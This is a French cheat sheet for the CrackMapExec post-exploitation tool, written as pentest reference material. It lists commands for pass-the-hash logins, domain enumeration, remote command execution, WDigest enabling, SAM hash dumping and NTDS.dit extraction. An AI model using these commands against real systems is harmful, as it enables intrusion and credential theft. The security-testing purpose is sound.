---
description: >-
  CrackMapExec (CME) - Outil de Post-Exploitation et
  d'Exploration                                  CrackMapExec étant vraiment un
  outil très complet je vous conseille cette cheatsheet, plus détaillé
---

# CrackMapExec

[https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)\
\
<mark style="color:yellow;">Description :</mark> \
CrackMapExec (CME) est un outil de post-exploitation en Python qui facilite l'exploration et l'exploitation des réseaux Windows. Il permet aux professionnels de la sécurité d'effectuer une variété de tâches sur des systèmes Windows compromis, y compris l'obtention d'informations d'identification, l'exécution de commandes à distance, l'exploitation de vulnérabilités et bien plus encore.

<mark style="color:yellow;">Exemples d'utilisation :</mark>

<mark style="color:green;">Connexions & Authentification :</mark>

* Connexion à un seul hôte : \
  `crackmapexec smb 192.168.215.104 -u user -p PASS`
* Connexion à plusieurs hôtes : \
  `crackmapexec smb 192.168.1.0-28 10.0.0.1-67 -u user -p PASS`
* Connexion avec NTLM hash :\
  &#x20;`crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH'`

<mark style="color:green;">Enumeration :</mark>

* Enumérer les utilisateurs :\
  &#x20;`crackmapexec smb 192.168.215.104 -u user -p PASS --users`
* Enumérer les groupes de domaine : \
  `crackmapexec smb 192.168.215.104 -u user -p PASS --groups`
* Enumérer les partages SMB : \
  `crackmapexec smb 192.168.215.138 -u user -p PASSWORD --local-auth --shares`
* Afficher les sessions actives : \
  `crackmapexec smb 192.168.215.104 -u user -p PASS --sessions`

<mark style="color:green;">Execution de commandes :</mark>

* Exécuter une commande avec cmd.exe (privilèges administratifs requis) : \
  `crackmapexec smb 192.168.10.11 -u Administrator -p P@ssw0rd -x whoami`

<mark style="color:green;">Obtention des Informations d'Identification :</mark>

* Extraire les hachages SAM locaux : \
  `crackmapexec smb 192.168.215.104 -u Administrator -p PASS --local-auth --sam`
* Activer ou désactiver WDigest pour obtenir les informations d'identification depuis la mémoire LSA : \
  `crackmapexec smb 192.168.215.104 -u Administrator -p PASS --local-auth --wdigest enable`
* Extraire le fichier NTDS.dit à partir du contrôleur de domaine (DC) : \
  `crackmapexec smb 192.168.1.100 -u UserName -p PASSWORDHERE --ntds`
* Extraire l'historique des mots de passe du fichier NTDS.dit : \
  `crackmapexec smb 192.168.1.0/24 -u UserName -p PASSWORDHERE --ntds-history`

<mark style="color:yellow;">Options Principales :</mark>

* smb : Utiliser le module SMB pour interagir avec les hôtes Windows.
* \-u \<nom\_utilisateur> : Spécifier le nom d'utilisateur pour l'authentification.
* \-p \<mot\_de\_passe> : Spécifier le mot de passe pour l'authentification.
* \--shares : Répertorier les partages SMB sur une machine cible.
* \-x "commande" : Exécuter une commande sur un système distant.
* \--exec-method=\<méthode> : Spécifier la méthode d'exécution pour l'exploitation.
* \--exe-file=\<fichier\_exploit> : Spécifier le fichier d'exploitation à utiliser.
